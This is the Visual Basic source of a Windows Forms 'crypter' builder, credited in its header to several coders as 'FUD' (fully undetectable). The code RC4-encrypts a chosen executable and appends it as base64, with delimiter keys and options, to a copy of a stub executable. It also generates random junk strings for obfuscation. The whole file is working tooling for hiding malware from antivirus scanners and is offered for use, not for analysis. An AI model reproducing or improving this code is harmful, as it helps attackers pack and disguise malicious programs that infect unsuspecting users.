
'''''''''''''''Feito em Visual Studio 2015''''''''''''''
'''''''''''''''Coded e Criador Do Gerador Pjoao1578'''''
'''''''''''''''coded  Dzkiller''''''''''''''''''''''''''
'''''''''''''''Coded Fud Mario''''''''''''''''''''''''''
''''''''''''''''Carlos.DF'''''''''''''''''''''''''''''''
'''''''''''''''Modificado Por Pjoao1578'''''''''''''''''
'''''''''''''''Cliente CR4 v2'''''''''''''''''''''''''''
'''''''''''''''27/04/2015'''''''''''''''''''''''''''''''
Imports System.IO
Imports Microsoft.VisualBasic.CompilerServices
Public Class Form1
    Const Dzkiller1 = "~-拉彩弗集力薩歐個凸彩闕達拉莫力法巧愛日小旅彩供動里姐薩卡梅瑪蒂里普阿阿嗖韋出闕酒韋薩托會勢嗖拉旅供旅-~" 'senha 01
    Const Dzkiller2 = "~-闕波問姐拉月盟德嗖薩力盟盟伊出止薩莫馬力旅淖托托供拉受酒淖莫歐納盟里塔室莫普作比月費拉蒂里勢蒂莫馬月-~" 'senha 02
    Dim Dz1, Dz2 As Boolean
    Dim cadena1 As String = "147852369014785023698514785429" 'Rodom Strigs
    Dim cadena2 As String = "QWERTYUIOPMNBVCqwsadfghjklçpgs" 'Rodom Strigs 02
    Dim cadena3 As String = "اییమایاုခی森ుంی帕میమုకုంခک帕တုزی奇" 'Rodom Strigs 03
    Dim RandomClass As New Random()
    Dim Algeria As SaveFileDialog = New SaveFileDialog

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        TextBox3.Text = cadena1
        TextBox4.Text = cadena3
        TextBox5.Text = cadena2
    End Sub

    Public Function rnd3(ByVal longitud As Integer) As String 'Rodom strigs 'Rodom strigs
        Dim cadena As String = "abcdefghijklmnopqrstuvwxyzA莫တခం帕یکస帕కیుںیںاငంBCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

        Dim r As New Random
        Dim l As Integer
        Dim sb As New System.Text.StringBuilder
        For i = 1 To longitud
            l = r.Next(0, 62)
            sb.Append(cadena.Substring(l, 1))
        Next

        Return sb.ToString()
    End Function
    Public Function rnd4(ByVal longitud As Integer) As String 'Rodom strigs 'Rodom strigs
        Dim cadena As String = "abcdefghijklmnopqrstuvwxyzA莫တခం帕یکసزایుںیںاငంBCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

        Dim r As New Random
        Dim l As Integer
        Dim sb As New System.Text.StringBuilder
        For i = 1 To longitud
            l = r.Next(0, 62)
            sb.Append(cadena.Substring(l, 1))
        Next

        Return sb.ToString()
    End Function
    Public Function rnd5(ByVal longitud As Integer) As String 'Rodom strigs 'Rodom strigs
        Dim cadena As String = "abcdefghijklmnopqrstuvwxyz莫တခం帕ی帕కیుںیںاငంABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

        Dim r As New Random
        Dim l As Integer
        Dim sb As New System.Text.StringBuilder
        For i = 1 To longitud
            l = r.Next(0, 62)
            sb.Append(cadena.Substring(l, 1))
        Next

        Return sb.ToString()
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog() With
      {
.Filter = "Portable Executable |*.exe"
      }
        If (openFileDialog.ShowDialog() = DialogResult.OK) Then
            Me.TextBox1.Text = openFileDialog.FileName
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog() With
       {
.Filter = "Portable Executable |*.exe"
}
        If (openFileDialog.ShowDialog() = DialogResult.OK) Then
            Me.TextBox2.Text = openFileDialog.FileName
        End If
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim Dzkiller As String
        If ((Me.TextBox1.Text = Nothing) Or (Me.TextBox2.Text = Nothing)) Then
            Interaction.MsgBox("Arquivos Errados Erro !", MsgBoxStyle.Information, Nothing)
        End If
        Try
            Using Algeria
                Algeria.Filter = "Executable Files (.exe)|*.exe"
                If (Algeria.ShowDialog = DialogResult.OK) Then
                    Dzkiller = Algeria.FileName
                Else
                    Return
                End If
            End Using
            Dim Alpha As Byte() = RC4pjoao1578(My.Computer.FileSystem.ReadAllBytes(TextBox1.Text), Dzkiller1)
            File.Copy(Me.TextBox2.Text, Dzkiller)
            IO.File.AppendAllText(Dzkiller, Dzkiller2 & Convert.ToBase64String(Alpha) & Dzkiller2 & Me.TextBox3.Text & Dzkiller2 & Dz1 & Dzkiller2 & Dz2)
            Interaction.MsgBox("Success Protection", MsgBoxStyle.Information, Nothing)

        Catch exception As System.Exception
            ProjectData.SetProjectError(exception)
            Interaction.MsgBox("Erro !", MsgBoxStyle.Critical, Nothing)
            ProjectData.ClearProjectError()
        End Try
    End Sub
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        'gerar Keys Rodom
        For i = 0 To 15
            System.Threading.Thread.Sleep(15)
            Application.DoEvents()
            TextBox3.Text = rnd3(NumericUpDown1.Value)
        Next
        For i = 0 To 15
            System.Threading.Thread.Sleep(15)
            Application.DoEvents()
            TextBox4.Text = rnd4(NumericUpDown1.Value)
        Next
        For i = 0 To 15
            System.Threading.Thread.Sleep(15)
            Application.DoEvents()
            TextBox5.Text = rnd5(NumericUpDown1.Value)
        Next
    End Sub

    Public Function RC4pjoao1578(ByVal Input As Byte(), ByVal Keys As String) As Byte() 'RC4


        Dim key As Byte() = System.Text.Encoding.ASCII.GetBytes(Keys)
        Dim i, j, swap As UInteger
        Dim s As UInteger() = New UInteger(255) {}
        Dim Output As Byte() = New Byte(Input.Length - 1) {}

        For i = 0 To 255
            s(i) = i
        Next

        For i = 0 To 255
            j = (j + key(i Mod key.Length) + s(i)) And 255
            swap = s(i)
            s(i) = s(j)
            s(j) = swap
        Next

        i = 0 : j = 0
        Dim c As Integer
        For c = 0 To Output.Length - 1
            i = (i + 1) And 255
            j = (j + s(i)) And 255
            swap = s(i)
            s(i) = s(j)
            s(j) = swap
            Output(c) = Input(c) Xor s((s(i) + s(j)) And 255)
        Next
        Return Output
    End Function

End Class